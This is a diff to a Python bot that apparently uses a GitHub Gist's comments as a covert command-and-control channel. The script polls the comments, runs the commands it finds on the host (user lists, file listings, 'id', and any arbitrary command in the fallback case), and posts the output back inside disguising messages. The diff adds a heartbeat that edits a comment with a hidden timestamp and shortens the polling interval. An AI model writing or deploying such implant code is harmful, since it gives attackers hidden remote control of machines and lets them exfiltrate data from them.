@@ -1,5 +1,6 @@
 #! /bin/python3
 import argparse
+from datetime import datetime
 import subprocess
 import requests
 from dotenv import dotenv_values
@@ -36,7 +37,7 @@ comments_url = f'{gist_url}/comments'
 headers = {"authorization": f'bearer {github_token}'}
 gist_response = requests.get(gist_url, headers=headers)
 gist = gist_response.json()
-state = {"last_update": gist['updated_at']}
+state = {"last_update": gist['updated_at'], "pong_comment": None}
 
 try:
     print(f"Channel url: {gist['url']}")
@@ -65,15 +66,39 @@ def get_commands(comments):
     return filter(lambda command: command != '', commands)
 
 
-def post_comment(message: str):
+def post_command(message: str):
     comment = f'{get_random_message()}\n\n{create_markdown_comment(message)}'
-    log(f'Sending comment "{comment}"')
+    log(f'Sending command "{comment}"')
 
     response = requests.post(
         comments_url, json={"body": comment}, headers=headers)
 
     log(response)
     state["last_update"] = response.json()['updated_at']
+    return response
+
+
+def pong():
+    def get_message():
+        return f"{get_random_message()}\n\n<!-- {datetime.now()} -->\n\n{create_markdown_comment('pong')}"
+    pong_comment = state['pong_comment']
+    log(f'pong')
+    if pong_comment is None:
+        response = requests.post(
+            comments_url, json={"body": get_message()}, headers=headers)
+        state['pong_comment'] = response.json()
+        return
+
+    response = requests.get(
+        f"{comments_url}/{pong_comment['id']}", headers=headers)
+
+    if response.status_code == 404:
+        state['pong_comment'] = None
+        pong()
+        return
+
+    requests.patch(
+        f'{comments_url}/{pong_comment["id"]}', json={"body": get_message()}, headers=headers)
 
 
 def list_to_string(input: list[str], separator=', '):
@@ -91,22 +116,22 @@ def handle_command(command: str):
             usernames = list(map(lambda line: line.decode(
                 'utf-8').split(' ')[0], result.splitlines()))[2:]
 
-            post_comment(list_to_string(usernames))
+            post_command(list_to_string(usernames))
         case 'ls':
             result = subprocess.check_output(['ls'] + args)
             filenames = list(map(lambda line: line.decode(
                 'utf-8').split(' ')[0], result.splitlines()))
-            post_comment(list_to_string(filenames))
+            post_command(list_to_string(filenames))
         case 'id':
             result = subprocess.check_output(['id'])
-            post_comment(result.decode('utf-8'))
+            post_command(result.decode('utf-8'))
         case 'ping':
-            post_comment('pong')
+            pong()
         case _:
             log('Unknown command: '+command)
             try:
                 result = subprocess.check_output([command]+args)
-                post_comment((result.decode('utf-8')))
+                post_command((result.decode('utf-8')))
             except FileNotFoundError:
                 log(f"No such file or directory: '{command}'")
             except PermissionError:
@@ -114,7 +139,7 @@ def handle_command(command: str):
 
 
 while True:
-    time.sleep(10)
+    time.sleep(5)
     log('fetching comments')
     comments = get_latest_comments()
     if len(comments) == 0:
